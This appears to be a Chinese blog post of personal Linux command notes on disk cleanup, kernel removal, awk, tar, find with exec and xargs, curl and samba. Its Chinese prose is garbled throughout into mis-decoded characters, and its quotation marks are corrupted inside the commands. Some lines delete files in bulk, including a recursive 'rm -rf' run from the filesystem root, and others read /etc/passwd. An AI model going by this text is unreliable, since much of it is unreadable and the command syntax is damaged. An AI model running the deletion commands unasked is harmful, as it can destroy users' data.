sourceå‘½ä»¤å…¶å®å°±æ˜¯æ‰§è¡Œä¸€ä¸ªè„šæœ¬å–æ¶ˆçš„è¯ï¼Œ unalias xxxå³å¯ touch ~/.bash_aliases ## unbuntuå»ºè®®æŠŠæ‰€æœ‰çš„aliaså†™åˆ°ä¸€ä¸ª ~/.bash_aliasesæ–‡ä»¶é‡Œã€‚ä¿å­˜ä¹‹å,source ~/.bash_aliasesã€‚ç«‹å³ç”Ÿæ•ˆ æ®è¯´aliasæ˜¯å¯ä»¥ä¼ å‚æ•°çš„ï¼Œä¸è¿‡åŠ ä¸Š&gt; /dev/null 2&gt;&amp;1 &amp; å°±ä¸è¡Œäº†ã€‚æ‰€ä»¥è¿˜æ˜¯å†™ä¸ªscriptç®—äº†ã€‚ #!/bin/bash kwrite $1 &gt; /dev/null 2&gt;&amp;1 &amp; ç„¶åchomod 755 fileName 4. pushdå’Œpopdï¼ˆç±»ä¼¼äºæ–‡ä»¶å¤¹stackï¼‰5. linuxåˆ é™¤åƒåœ¾æ–‡ä»¶ï¼ˆå°ç¡¬ç›˜linuxç£ç›˜è¦ç»å¸¸æ¸…ç†éœ€è¦çš„å‘½ä»¤ï¼‰IBMç»™å‡ºäº†åˆ é™¤ä¸€äº›åƒåœ¾æ–‡ä»¶çš„å»ºè®®ä½¿ç”¨ Linux å‘½ä»¤åˆ é™¤åƒåœ¾æ–‡ä»¶ sudo apt-get autoclean æ¸…ç†æ—§ç‰ˆæœ¬çš„è½¯ä»¶ç¼“å­˜sudo apt-get clean æ¸…ç†æ‰€æœ‰è½¯ä»¶ç¼“å­˜sudo apt-get autoremove åˆ é™¤ç³»ç»Ÿä¸å†ä½¿ç”¨çš„å­¤ç«‹è½¯ä»¶ autoremoveæœ‰æ—¶å€™ä¼šæŠ¥é”™ï¼š The link /initrd.img.old is a damaged linkRemoving symbolic link initrd.img.old you may need to re-run your boot loader[grub] æ ¹æ®askubuntuçš„è§£ç­”ï¼Œä¸ç”¨ç®¡ du â€“max-depth=1 -h # æŸ¥çœ‹å½“å‰è·¯å¾„ä¸‹æ‰€æœ‰æ–‡ä»¶/æ–‡ä»¶å¤¹çš„å¤§å°du -k â€“max-depth=2 | sort -rn # åŠ ä¸Šæ’åºfind / -name core -print -exec rm -rf {} \\; //åˆ†å·ä¹Ÿè¦ï¼Œäº²æµ‹find / -size +100Mï¼šåˆ—å‡ºæ‰€æœ‰å¤§äº100Mçš„æ–‡ä»¶ï¼Œäº²æµ‹ã€‚é ç€è¿™ä¸ªæ‰¾åˆ°äº†shadowsocksçš„æ—¥å¿—æ–‡ä»¶,170MBä¸Šé¢è¿™ä¸ªå‘½ä»¤æ˜¯ä¸èƒ½åˆ—å‡ºæ–‡ä»¶å¤§å°çš„ï¼Œè¿˜æƒ³è¦æŸ¥çœ‹æ–‡ä»¶å¤§å°çš„è¯find / -type f -size +50M -exec du -h {} \\; | sort -nfind . -mindepth 1 -maxdepth 1 -printf â€˜%f\\nâ€™ //æ‰“å°å‡ºå½“å‰ç›®å½•ä¸‹æ‰€æœ‰æ–‡ä»¶ï¼ŒåŸºæœ¬ä¸Šå°±æ˜¯ä¸€ä¸ªlså‘½ä»¤äº†find / -type f -printf â€˜%T+ %p\\nâ€™ | sort | head -n 1 //how-to-find-the-oldest-file-in-a-directory-treeï¼Œæ‰¾åˆ°ä¸€ä¸ªç›®å½•ä¸‹æœ€è€çš„æ–‡ä»¶ åˆ é™¤/bootåˆ†åŒºä¸éœ€è¦çš„å†…æ ¸å…ˆdf -hçœ‹/bootåˆ†åŒºä½¿ç”¨æƒ…å†µï¼›ç„¶å dpkg â€“get-selections|grep linux-image ;æŸ¥çœ‹å½“å‰ä½¿ç”¨çš„å†…æ ¸ uname -a ; lsb_release -a æ¸…ç†ä¸ç”¨çš„å†…æ ¸ sudo apt-get purge linux-image-3.13.0-24-generic ï¼ˆæ³¨æ„ï¼Œä¸è¦åˆ æ­£åœ¨ä½¿ç”¨çš„å†…æ ¸ï¼‰åˆ é™¤ä¸è¦çš„å†…æ ¸æ–‡ä»¶é¦–å…ˆçœ‹ä¸‹ uname- adpkg â€“get-selections|grep linux //æŸ¥æ‰¾æ‰€æœ‰çš„æ–‡ä»¶ï¼Œæœ‰imageçš„å°±æ˜¯å†…æ ¸æ–‡ä»¶sudo apt-get remove å†…æ ¸æ–‡ä»¶å ï¼ˆä¾‹å¦‚ï¼šlinux-image-4.4.0-92-genericï¼‰ sudo dpkg â€“get-selections | awk â€˜$2 !~ /^install/â€˜ æŸ¥æ‰¾é‚£äº›çŠ¶æ€æ˜¯deinstallçš„å†…æ ¸ï¼Œç„¶åç”¨è¿™æ ·çš„æ–¹å¼purgeæ‰sudo dpkg -P linux-image-3.5.0-51-generic /var/log/btmp è¿™ä¸ªæ–‡ä»¶æ˜¯è®°å½•é”™è¯¯ç™»å½•çš„æ—¥å¿—ï¼Œå¦‚æœå¼€æ”¾22ç«¯å£çš„è¯ï¼Œç”¨ä¸äº†å¤šä¹…è¿™ä¸ªæ–‡ä»¶å°±ä¼šå˜å¾—å¾ˆå¤§ç³»ç»Ÿ /var/log ä¸‹é¢çš„æ–‡ä»¶ï¼šbtmp, wtmp, utmp ç­‰éƒ½æ˜¯äºŒè¿›åˆ¶æ–‡ä»¶ï¼Œæ˜¯ä¸å¯ä»¥ä½¿ç”¨ tail å‘½ä»¤æ¥è¯»å–çš„ï¼Œè¿™æ ·ä¼šå¯¼è‡´ç»ˆç«¯å‡ºé”™ã€‚ä¸€èˆ¬ä½¿ç”¨ last ç³»åˆ—å‘½ä»¤æ¥è¯»å–ï¼Œå¦‚ last, lastb, lastlogã€‚ ä¸€ä¸ªç›®å½•ä¸‹æŒ‰ç…§æ–‡ä»¶å¤§å°æ’åº ls -Sralh ## äº²æµ‹ï¼Œä»å°åˆ°å¤§æ’åºå‡ºæ¥åŠ ä¸Š-Så‚æ•°ï¼Œå°±å¯ä»¥æ ¹æ®æ–‡ä»¶çš„å¤§å°è¿›è¡Œæ’åºï¼Œé»˜è®¤æ˜¯ä»å¤§åˆ°å°çš„é¡ºåºã€‚åœ¨æ­¤åŸºç¡€ä¸ŠåŠ ä¸Šå‚æ•°-rå˜æˆ-Srï¼Œå°±å¯ä»¥ä¸€è‡ªå°åˆ°å¤§çš„é¡ºåºæ‰“å°å‡ºæ–‡ä»¶ã€‚-lå‚æ•°è¡¨ç¤ºæ‰“å°å‡ºè¯¦ç»†ä¿¡æ¯ã€‚ 6. AWKæ–‡æœ¬åˆ†æå·¥å…· AWK is a language for processing text filesawk was created at Bell labs released in 1977Named after Alfred Aho, Peter Weinberger,and Brain KernighanTAPL= The AWK Programming Language awk â€˜{print $0}â€™ /etc/passwd # å’Œcatå·®ä¸å¤šï¼Œæ˜¾ç¤ºæ–‡æœ¬å†…å®¹æŸ¥çœ‹æ¶æ„IPè¯•å›¾ç™»å½•æ¬¡æ•°ï¼š lastb | awk â€˜{ print $3 }â€™ | sort | uniq -c | sort -n ## äº²æµ‹å¯ç”¨,çœ‹ä¸Šå»æŒºå“äººçš„ awkæ€ä¹ˆç”¨Using Linux AWK Utilityï¼Œä¸€ä¸ªæ²¡æœ‰åºŸè¯çš„æ•™ç¨‹ï¼Œéå¸¸å¥½ã€‚å®˜æ–¹çš„å¤è€çš„awkæ•™ç¨‹ drwxr-xr-x 3 root root 4096 Mar 14 2017 ufw-rw-râ€“râ€“ 1 root root 338 Nov 18 2014 updatedb.confdrwxr-xr-x 3 root root 4096 Aug 30 03:53 update-managerdrwxr-xr-x 2 root root 4096 Aug 30 03:53 update-motd.ddrwxr-xr-x 2 root root 4096 Mar 14 2017 update-notifierdrwxr-xr-x 2 root root 4096 Mar 14 2017 vimdrwxr-xr-x 3 root root 4096 Mar 14 2017 vmware-toolslrwxrwxrwx 1 root root 23 Mar 14 2017 vtrgb -&gt; /etc/alternatives/vtrgb-rw-râ€“râ€“ 1 root root 4942 Jun 14 2016 wgetrcdrwxr-xr-x 5 root root 4096 Mar 14 2017 X11drwxr-xr-x 3 root root 4096 Mar 14 2017 xdgdrwxr-xr-x 2 root root 4096 Mar 14 2017 xml å‡è®¾ä½ é¢å¯¹ä¸€ä¸ªè¿™æ ·çš„æ–‡ä»¶test.txtprint æ¯ä¸€è¡Œ : awk â€˜{ print }â€™ test.txtprintç¬¬ä¸€è¡Œ ï¼š awk â€˜{ print $1 }â€™ test.txtprintç¬¬äºŒè¡Œ: awk â€˜{ print $2 }â€™ test.txtprintç¬¬ä¸€è¡Œå’Œç¬¬äºŒè¡Œ awk â€˜{ print $1,$2 }â€™ test.txtprintç¬¬ä¸€è¡Œå’Œç¬¬äºŒè¡Œä¸­é—´ä¸å¸¦ç©ºæ ¼ awk â€˜{ print $1$2 }â€™ test.txtprintåŒ…å«â€™testâ€™çš„è¡Œ awk â€˜/test/ { print } test.txtâ€™printç¬¬äºŒè¡ŒåŒ…å«â€™testâ€™çš„è¡Œ awk â€˜{if(2 ~ /test/) print }â€™ test.txtawk â€˜/[a-z]/ { print }â€™ test.txt //åŒ…å«a-zä»»ä¸€å­—æ¯çš„awk â€˜/[0-8]/ { print }â€™ test.txt // åŒ…å«0-8ä»»ä¸€æ•°å­—çš„awk â€˜/^[0-8]/ { print }â€™ test.txt // ä»¥0-8ä»»ä¸€æ•°å­—å¼€å¤´çš„awk â€˜/[0-8]$/ { print }â€™ test.txt //ä»¥0-8ä»»ä¸€æ•°å­—ç»“å°¾çš„awk â€˜NR==5 || NR==9â€™ â€œfileâ€ //NRæ˜¯è¡Œå·awk â€˜NR&gt;=5&amp;&amp;NR&lt;=9â€™ â€œfileâ€ //NRè¿˜å¯ä»¥æŒ‡å®šè¡Œå·èŒƒå›´ sudo last | awk â€˜{ print $(NF-7)}â€™ //æˆ‘æƒ³çœ‹å€’æ•°ç¬¬7åˆ—çš„æ•°æ® å’Œç®¡é“ç»“åˆçš„ï¼šgrep -i test test.txt | awk â€˜/[0-9]/ { print }â€™-iè¡¨ç¤ºcase insensitive,å¤§å°å†™éƒ½ç®—.ç„¶åæ‰¾å‡ºå…¶ä¸­åŒ…å«æ•°å­—çš„ã€‚ æƒ³è¦æ‰¾å‡ºç³»ç»Ÿå†…æ‰€æœ‰å¤§å°è¶…å‡º10MBçš„ï¼Œåˆè®¡ä¸€ä¸‹è¿™äº›å¤§æ–‡ä»¶ä¸€å…±å ç”¨äº†å¤šå°‘MBçš„ç©ºé—´sudo find / -size +10M -exec du -h {} \\; | awk â€˜{ s+=$1 } END { print s}â€™ *æŸ¥æ‰¾å¤§æ–‡ä»¶ï¼Œå¹¶ä¸”æŒ‰ç…§æ–‡ä»¶å¤§å°ä»å¤§åˆ°å°æ’åºsudo find -type f -size +10M -print0 |xargs -0 du -h|sort -nr awké‡Œé¢è¿˜èƒ½forå¾ªç¯sudo netstat -a | awk â€˜/^tcp/ {++S[$NF]} END {for(a in S) print a, S[a]}â€™ awk -F â€˜â€œâ€˜ xxxxx ### ä»¥åŒå¼•å·ä¸ºåˆ†éš”ç¬¦çš„ 30ä¸ªå®ç”¨çš„awkå‘½ä»¤ awkæ­£åˆ™awk â€˜$1 ~ /J/â€˜ inventory-shipped ## æœ‰å¤§å†™å­—æ¯Jçš„è¯å°±æ‰“å°å‡ºæ¥awk â€˜$1 !~ /J/â€˜ inventory-shipped ##æ’é™¤æ‰€æœ‰åŒ…å«Jçš„å†…å®¹ é˜®ä¸€å³°çš„awkæ•™ç¨‹ coolshellçš„æ•™ç¨‹ awkè¿˜èƒ½å†™if elsecat testfile ProductA 30 ProductB 76 ProductC 55 $ awk â€˜$2&lt;75 {printf â€œ%s\\t%s\\nâ€, $0, â€œREORDERâ€;} $2&gt;=75 {print $0;}â€™ testfileProductA 30 REORDERProductB 76ProductC 55 REORDER 7.tarå‘½ä»¤ä¸»è¦æ˜¯è·Ÿå‹ç¼©å’Œè§£å‹æ–‡ä»¶æœ‰å…³çš„,å‚è€ƒ tar -cvf log.tar log2012.log ä»…æ‰“åŒ…ï¼Œä¸å‹ç¼©ï¼ tar -zcvf log.tar.gz log2012.log æ‰“åŒ…åï¼Œä»¥ gzip å‹ç¼© tar -jcvf log.tar.bz2 log2012.log æ‰“åŒ…åï¼Œä»¥ bzip2 å‹ç¼© å¸¸ç”¨çš„tarå‘½ä»¤å°±é‚£ä¹ˆå‡ ä¸ªtar -cvf all.tar.gz å’Œ tar -xf all.tar.gzè¿™ä¿©å…¶å®å°±å¤Ÿç”¨äº† //å…¶å®è§£å‹ç¼©åº”è¯¥æ˜¯è¿™æ ·çš„å°±å¥½äº†alias untar=â€™tar -zxvf â€˜ å¯¹ç…§æ‰‹å†Œæ¥çœ‹ï¼š-c //å°å†™çš„cï¼Œâ€“createï¼Œè¡¨ç¤ºåˆ›å»ºæ–°çš„å¤‡ä»½æ–‡ä»¶-v //verbose,æ˜¾ç¤ºè¿›åº¦ä»€ä¹ˆçš„-f æŒ‡å®šè¦æ“ä½œçš„archiveæ–‡ä»¶-z â€“gzipï¼Œé€šè¿‡gzipå‹ç¼©æˆ–è€…è§£å‹æ–‡ä»¶ 8.å®šæ—¶ä»»åŠ¡æ€ä¹ˆå†™(crontab)å·²ç»æœ‰ç½‘ç«™æŠŠå„ç§å¸¸ç”¨çš„exampleå†™å‡ºæ¥äº†ï¼Œç›´æ¥ç…§æŠ„å°±æ˜¯åé¢è·Ÿä¸Šéœ€è¦çš„å‘½ä»¤ï¼Œä¾‹å¦‚é‡å¯å°±æ˜¯ /sbin/reboot 9.findæ ¹æ®æ–‡ä»¶åæŸ¥æ‰¾æ–‡ä»¶ - find -name *.config #åœ¨å½“å‰ç›®å½•ä¸‹æŸ¥æ‰¾ - find / -name finename # åœ¨æ ¹ç›®å½•ä¸‹æŸ¥æ‰¾filenameçš„æ–‡ä»¶(&quot;filename&quot;ç”¨åŒå¼•å·åŒ…èµ·æ¥) 10.å·²å®‰è£…çš„è½¯ä»¶ sudo dpkg -l apt install libevent-dev//libeventè£…åˆ°å“ªå„¿å»äº†ï¼Ÿdpkg -L libevent-dev 11.Pingä¸€ä¸ªä¸»æœº ping -c 5 gmail.com #åªå‘é€5æ¬¡ 12.wgetä¸‹è½½æ–‡ä»¶ wget urlä¸‹è½½æ–‡ä»¶å¹¶ä»¥æŒ‡å®šçš„æ–‡ä»¶åä¿å­˜ä¸‹æ¥ wget -0 filename url 13.æŸ¥çœ‹æ–‡ä»¶çš„æ—¶å€™æ˜¾ç¤ºè¡Œå·cat -n rsyslog.conf # æ˜¾ç¤ºè¡Œå·ï¼ŒæŠ¥é”™çš„æ—¶å€™æ–¹ä¾¿å¤„ç†-n æ˜¾ç¤ºè¡Œå·ï¼ˆåŒ…æ‹¬ç©ºè¡Œï¼‰-b æ˜¾ç¤ºè¡Œå·ï¼ˆä¸åŒ…æ‹¬ç©ºè¡Œï¼‰ 14.ç»Ÿè®¡æ–‡ä»¶å¤¹ä¸‹ç‰¹å®šæ–‡ä»¶ç±»å‹çš„æ•°ç›® ls -l |grep â€œ^-â€œ|wc -l ##ç»Ÿè®¡æŸæ–‡ä»¶å¤¹ä¸‹æ–‡ä»¶çš„ä¸ªæ•° ls -l |grep â€œ^ï½„â€|wc -l ##ç»Ÿè®¡å½“å‰ç›®å½•ä¸­æ–‡ä»¶å¤¹çš„æ•°é‡ ls -lR|grep â€œ^-â€œ|wc -l ##é€’å½’ä¸€å±‚å±‚å¾€ä¸‹æ‰¾çš„è¯ï¼ŒåŠ ä¸Šä¸€ä¸ªRå°±å¯ä»¥äº†ç»Ÿè®¡æŸä¸ªç›®å½•ä¸‹çš„æ‰€æœ‰jsæ–‡ä»¶ï¼š ls -lR /home/user|grep js|wc -l ls -alh ## äº²æµ‹ï¼Œå¯ä»¥æ˜¾ç¤ºå½“å‰ç›®å½•ä¸‹å„ä¸ªæ–‡ä»¶çš„å¤§å° å…³äºwcçš„ä¸€äº›å‚æ•° -c ç»Ÿè®¡å­—èŠ‚æ•°ã€‚-l ç»Ÿè®¡è¡Œæ•°ã€‚-m ç»Ÿè®¡å­—ç¬¦æ•°ã€‚è¿™ä¸ªæ ‡å¿—ä¸èƒ½ä¸ -c æ ‡å¿—ä¸€èµ·ä½¿ç”¨ã€‚-w ç»Ÿè®¡å­—æ•°ã€‚ä¸€ä¸ªå­—è¢«å®šä¹‰ä¸ºç”±ç©ºç™½ã€è·³æ ¼æˆ–æ¢è¡Œå­—ç¬¦åˆ†éš”çš„å­—ç¬¦ä¸²ã€‚-L æ‰“å°æœ€é•¿è¡Œçš„é•¿åº¦ã€‚-help æ˜¾ç¤ºå¸®åŠ©ä¿¡æ¯â€“version æ˜¾ç¤ºç‰ˆæœ¬ä¿¡æ¯wc filename ##é»˜è®¤æ˜¾ç¤ºå‡ºæ¥çš„ä¸‰åˆ—åˆ†åˆ«æ˜¯è¡Œæ•°ï¼Œå­—æ•°ï¼Œå­—èŠ‚æ•° 15. curlå‘½ä»¤å†™shellè„šæœ¬å¯èƒ½ä¼šç”¨åˆ°ç½‘ç»œäº¤äº’ï¼Œcurlå¯ä»¥å‘èµ·ç½‘ç»œè¯·æ±‚ï¼Œä¸‹è½½æ–‡ä»¶ï¼Œä¸Šä¼ æ–‡ä»¶ï¼Œcookieå¤„ç†ï¼Œæ–­ç‚¹ç»­ä¼ ï¼Œåˆ†æ®µä¸‹è½½,ftpä¸‹è½½æ–‡ä»¶éšä¾¿å†™ä¸¤ä¸ªï¼š curl -o home.html http://www.baidu.com #æŠŠç™¾åº¦é¦–é¡µæŠ“ä¸‹æ¥ï¼Œå†™åˆ°home.htmlä¸­ curl -d â€œuser=nick&amp;password=12345â€ http://www.xxx.com/login.jsp # æäº¤è¡¨å•ï¼Œå‘èµ·POSTè¯·æ±‚ curlçš„å‡ ç§å¸¸è§ç”¨æ³• curl -i -H â€œAccept: application/jsonâ€ â€œhttps://jsonplaceholder.typicode.com/posts&quot; ## -i è¡¨ç¤ºincludeï¼Œå°±æ˜¯è¯´æŠŠheaderåŒ…å«åœ¨responseä¸­ è¦æ˜¯åªéœ€è¦headerçš„è¯curl -s -I -X POST http://www.google.com //åªéœ€è¦headerå°±è¡Œäº† ä¸‹é¢æ˜¯ä¸€ä¸ªç®€å•çš„é€šè¿‡CURLæäº¤POSTè¯·æ±‚çš„æ–¹å¼-Xæ˜¯æŒ‡å®šHTTP methodï¼Œé»˜è®¤æ˜¯GET curl â€“header â€œContent-Type: application/jsonâ€ â€“request POST â€“data â€˜{â€œuserIdâ€:10,â€titleâ€:â€sometitle2â€,â€bodyâ€:â€somebody2â€}â€™ https://jsonplaceholder.typicode.com/posts ä¸‹é¢è¿™ä¸ªæ˜¯ç®€å†™curl â€“header â€œContent-Type: application/jsonâ€ -X POST -d â€˜{â€œuserIdâ€:10,â€titleâ€:â€sometitle2â€,â€bodyâ€:â€somebody2â€}â€™ https://jsonplaceholder.typicode.com/posts jsonè§„èŒƒä¸å…è®¸å•å¼•å·curl â€“header â€œContent-Type: application/jsonâ€ -X POST -d â€˜{â€œuserIdâ€:10,â€titleâ€:â€sometitle2â€,â€bodyâ€:â€somebody2â€,â€hobbyâ€:[{â€œnameâ€:â€bobâ€,â€ageâ€:10},{â€œnameâ€:â€samâ€,â€ageâ€:20}]}â€™ http://127.0.0.1:5000/ curl show raw responsecurl -iv â€“raw https://www.google.com/ (#iæ˜¯include headerï¼Œvæ˜¯verbose) ç”šè‡³è¿˜æœ‰ç›´æ¥ä¸€è¡Œè¡Œå†™htmlæŠ¥æ–‡çš„ï¼š echo &#39;GET / HTTP/1.1 Host: baidu.com &#39; | openssl s_client -quiet -connect baidu.com:443 2&gt;/dev/null è®°å¾—http statusCode 302æ˜¯é‡å®šå‘ä»€ä¹ˆ ï¼š curl -v mail.qq.comè¾“å‡ºï¼š`curl -v mail.qq.com Rebuilt URL to: mail.qq.com/ Trying 103.7.30.100â€¦ Connected to mail.qq.com (103.7.30.100) port 80 (#0) GET / HTTP/1.1Host: mail.qq.comUser-Agent: curl/7.47.0Accept: / &lt; HTTP/1.1 302 Found&lt; Server: TWS&lt; Connection: close&lt; Date: Sun, 19 Nov 2017 09:19:46 GMT&lt; Content-Type: text/html; charset=GB18030&lt; Location: https://mail.qq.com/cgi-bin/loginpage&lt; Content-Security-Policy: referrer origin; script-src â€˜selfâ€™ https://hm.baidu.com http://hm.baidu.com .google-analytics.com http://mat1.gtimg.com https://mat1.gtimg.com http://.soso.com https://.soso.com http://.qq.com https://.qq.com http://.qqmail.com https://*.qqmail.com http://pub.idqqimg.com blob: â€˜unsafe-inlineâ€™ â€˜unsafe-evalâ€™; report-uri https://mail.qq.com/cgi-bin/report_cgi?r_subtype=csp&amp;nocheck=false&lt; Referrer-Policy: origin&lt; Content-Length: 0&lt; Closing connection 0`http 302çš„æ„æ€ä¹Ÿå°±è¯´æ˜qqé‚®ç®±å·²ç»æŠŠhttpé‡å®šå‘åˆ°åˆ«çš„åœ°æ–¹çš„ 16. æ­å»ºsambaæœåŠ¡å™¨è¿™ä¸ªä¸»è¦æ˜¯ç”¨æ¥ä»windowsä¸Šè®¿é—®linuxä¸»æœºä¸Šçš„æ–‡ä»¶çš„ sudo apt-get install sambaå‰©ä¸‹çš„å°±æ˜¯è®¾å®šè¦åˆ†äº«çš„ç›®å½•ï¼Œç»™æƒé™ï¼Œè®¾å®šè®¿é—®å¯†ç ï¼Œå¯åŠ¨æœåŠ¡è¿™äº›äº†æ•™ç¨‹ 17. teeå‘½ä»¤ echo $(date) | tee -a date.logteeå‘½ä»¤èƒ½å¤ŸæŠŠç¨‹åºçš„è¾“å‡ºè¾“å‡ºåˆ°stdo,åŒæ—¶è¿˜èƒ½å°†è¾“å‡ºå†™è¿›æ–‡ä»¶(-a è¡¨ç¤ºappendï¼Œå¦åˆ™å°±æ˜¯è¦†ç›–) 18. missing argument to `-execâ€™findå’Œexecå‘½ä»¤ç»“åˆèµ·æ¥èƒ½å¤Ÿå®ç°æŒ‡å®šï¼ˆæˆ–è€…ä¸æŒ‡å®šï¼‰æ–‡ä»¶ä¸­æŸ¥æ‰¾ç‰¹å®šå­—ç¬¦çš„æ•ˆæœæ¯”æ–¹è¯´åœ¨sqlalchemyé¡¹ç›®ä¸­ï¼ŒæŸ¥æ‰¾å½“å‰ç›®å½•ä¸‹æ‰€æœ‰çš„pyæ–‡ä»¶ï¼Œåœ¨é‡Œé¢æ‰«æSQLALCHEMY_DATABASE_URIçš„å€¼ sudo find . -name â€œ.pyâ€ -exec grep â€œSQLALCHEMY_DATABASE_URIâ€ {} \\;sudo find . -name â€œ.pyâ€ | xargs grep â€œSQLALCHEMY_DATABASE_URIâ€grep SQLALCHEMY_DATABASE_URI . -R ä¸Šé¢è¿™ä»¨éƒ½æ˜¯okçš„ ,ç¬¬ä¸€ç§ä¸ä¼šæŠŠå¯¹åº”çš„æ–‡ä»¶ååˆ—å‡ºæ¥ï¼Œç¬¬äºŒç§å’Œç¬¬ä¸‰ç§ä¼šæŠŠæ–‡ä»¶ååˆ—å‡ºæ¥ã€‚ç¬¬ä¸‰ç§çš„-Rå½“ç„¶æ˜¯é€’å½’(recursive)çš„æ„æ€ find /u03 -name server.xml -exec grep &#39;9080&#39; {}\\; find . -type f -exec ls -l {} \\; ## execæ‰§è¡Œåˆ é™¤ä¹‹å‰æœ€å¥½å…ˆæ‰“å°å‡ºæ¥ï¼Œé¿å…åˆ é”™äº† find . -type f -mtime +14 -exec rm {} \\; find /etc -name &quot;passwd*&quot; -exec grep &quot;root&quot; {} \\; å¦å¤– {} + å’Œ {} \\; è¿™ä¸¤ç§å†™æ³•æ˜¯æœ‰åŒºåˆ«çš„[what-is-meaning-of-in-finds-exec-command(https://unix.stackexchange.com/questions/195939/what-is-meaning-of-in-finds-exec-command) execæ˜¯å’Œfindä¸€èµ·ä½¿ç”¨çš„ï¼Œåˆ†å·æ˜¯è¦æ‰§è¡Œçš„å‘½ä»¤çš„ç»ˆæ­¢æ ‡å¿—ï¼Œå‰é¢å¾—åŠ ä¸Šæ–œæ ã€‚ç®€å•æ¥è¯´ï¼Œå°±æ˜¯æŠŠexecå‰é¢çš„ç»“æœæ‰§è¡ŒæŸé¡¹æ“ä½œï¼Œè¯­æ³•ä¸Šï¼Œå¤§æ‹¬å·ä¸èƒ½å°‘ï¼Œåæ–œæ ä¸èƒ½å°‘ï¼Œåˆ†å·ä¸èƒ½å°‘æ„Ÿè§‰execå’Œfind å‘½ä»¤çš„xargså·®ä¸å¤šfindå‘½ä»¤è¦ç»“åˆç€execå’Œxargså‘½ä»¤ä¸€èµ·æ¥çœ‹xargså‘½ä»¤çš„ä½œç”¨ï¼Œæ˜¯å°†æ ‡å‡†è¾“å…¥è½¬ä¸ºå‘½ä»¤è¡Œå‚æ•°ã€‚xargså‘½ä»¤é˜®ä¸€å³°çš„xargsæ•™ç¨‹ ä¾‹å¦‚å¯ä»¥é’ˆå¯¹æ–‡æœ¬æ–‡ä»¶çš„æ¯ä¸€è¡Œå‘½ä»¤è¿›è¡Œæ“ä½œ echo {0..9} | xargs -n 2 echo execå‘½ä»¤å¯ä»¥è®¤ä¸ºå°±æ˜¯æŠŠfindå‡ºæ¥çš„æ‰€æœ‰ç»“æœå¡«å……åˆ°execçš„å¤§æ‹¬å·é‡Œé¢,å› ä¸ºå¹³æ—¶å®é™…ä»ä¸€ä¸ªæ–‡ä»¶ä¸­æŸ¥æ‰¾å­—ç¬¦çš„æ–¹å¼å°±æ˜¯grep â€œSQLALCHEMY_DATABASE_URIâ€ somefilenameè¿™ä¹Ÿé€ æˆäº†ä½¿ç”¨execç»å¸¸å‡ºç°è¯­å‡ºé”™è¯¯ï¼Œfindå‘½ä»¤æŠŠåŒ¹é…åˆ°çš„æ–‡ä»¶ä¼ é€’ç»™xargså‘½ä»¤ï¼Œè€Œxargså‘½ä»¤æ¯æ¬¡åªè·å–ä¸€éƒ¨åˆ†æ–‡ä»¶è€Œä¸æ˜¯å…¨éƒ¨ï¼Œä¸åƒ-execé€‰é¡¹é‚£æ ·ã€‚xargsæ˜¯åˆ†æ‰¹å¤„ç†å‚æ•°å¹¶ä¼ é€’ç»™åç»­çš„å‘½ä»¤ã€‚ xargså’Œgrepä¸€èµ·ç”¨æœ‰æ—¶å€™ä¼šå‡ºç°no such file or directoryçš„é”™è¯¯why-does-grep-print-out-no-such-file-or-directory find . -type f -print0 | xargs -0 fgrep â€œSQLALCHEMY_DATABASE_URIâ€ xargsçš„ä¸€äº›ç”¨æ³•find . -name â€œ.logâ€ | xargs -i mv {} test4find . -name â€œ.logâ€ | xargs -p -i mv {} .. ## -pä¼šæç¤ºç”¨æˆ·æ˜¯å¦è¦æ‰§è¡Œåç»­æ“ä½œ find / -type ## è¿™ä¸ª-typeè¡¨ç¤ºç±»å‹ï¼Œfæ˜¯æ™®é€šæ–‡ä»¶,dæ˜¯ç›®å½•,cæ˜¯å­—ç¬¦è®¾å¤‡æ–‡ä»¶,pæ˜¯ç®¡é“æ–‡ä»¶,læ˜¯ç¬¦å·é“¾æ¥æ–‡ä»¶ è¦æƒ³è®©ç³»ç»Ÿé«˜è´Ÿè·è¿è¡Œï¼Œå°±ä»æ ¹ç›®å½•å¼€å§‹æŸ¥æ‰¾æ‰€æœ‰çš„æ–‡ä»¶ã€‚find / -name â€œâ€œ -printå¦‚æœæƒ³åœ¨å½“å‰ç›®å½•æŸ¥æ‰¾æ–‡ä»¶åä»¥ä¸€ä¸ªä¸ªå°å†™å­—æ¯å¼€å¤´ï¼Œæœ€åæ˜¯4åˆ°9åŠ ä¸Š.logç»“æŸçš„æ–‡ä»¶ï¼šfind . -name â€œ[a-z][4-9].logâ€ -print findè¿˜å¯ä»¥æ ¹æ®æ–‡ä»¶æƒé™æ¥æŸ¥æ‰¾find . -perm 755 -print ## æ¯”å¦‚æŸ¥æ‰¾å½“å‰755æƒé™çš„æ–‡ä»¶findè¿˜å¯ä»¥å¿½ç•¥æŒ‡å®šç›®å½•-pruneå‚æ•°è¿˜å¯ä»¥æŒ‰ç…§ä¿®æ”¹æ—¶é—´æˆ–è€…è®¿é—®æ—¶é—´ç­‰æ¥æŸ¥æ‰¾æ–‡ä»¶sudo find / -size +10M -mtime -2 -exec du -h {} \\; ## æŸ¥çœ‹æœ€è¿‘ä¸¤å¤©ä¿®æ”¹çš„æ–‡ä»¶ä¸­é‚£äº›å¤§å°è¶…è¿‡äº†10Mï¼Œå¹¶ä¸”åˆ—å‡ºæ¥sudo find / -name â€œ*.logâ€ -size +10k -mtime -2 -exec du -h {} \\; | sort -n ## æŠŠæœ€è¿‘ä¸¤å¤©å†…ä¿®æ”¹çš„.logæ–‡ä»¶ï¼ˆè¶…è¿‡10Kçš„ï¼‰æŒ‰ç…§æ–‡ä»¶å¤§å°ä»å¤§åˆ°å°æ’åˆ—å‡ºæ¥atime = accesstime(æ–‡ä»¶è¢«readæˆ–è€…æ‰§è¡Œçš„æ—¶é—´)ctime = changetime(æ–‡ä»¶çŠ¶æ€æ”¹å˜æ—¶é—´ï¼Œæ¯”å¦‚è¢«chmodå°±ç®—)mtime = modify timeï¼ŒæŒ‡çš„æ˜¯æ–‡ä»¶å†…å®¹è¢«ä¿®æ”¹çš„æ—¶é—´è¿™äº›æ—¶é—´éƒ½èƒ½é€šè¿‡staå‘½ä»¤æŸ¥çœ‹ //åœ¨ä¸€ä¸ªç›®å½•ä¸‹æŸ¥æ‰¾ åŒ…å«â€œprintfâ€å…³é”®å­—çš„txtæ–‡ä»¶find . -name â€œ*.txtâ€ | xargs grep â€œprintfâ€ 19. sortå‘½ä»¤sortå‘½ä»¤æ’åºä»€ä¹ˆçš„ ls -al | sort -n ## æŒ‰ç…§æ–‡ä»¶åASCIIç å€¼è¿›è¡Œæ¯”è¾ƒ ls -al 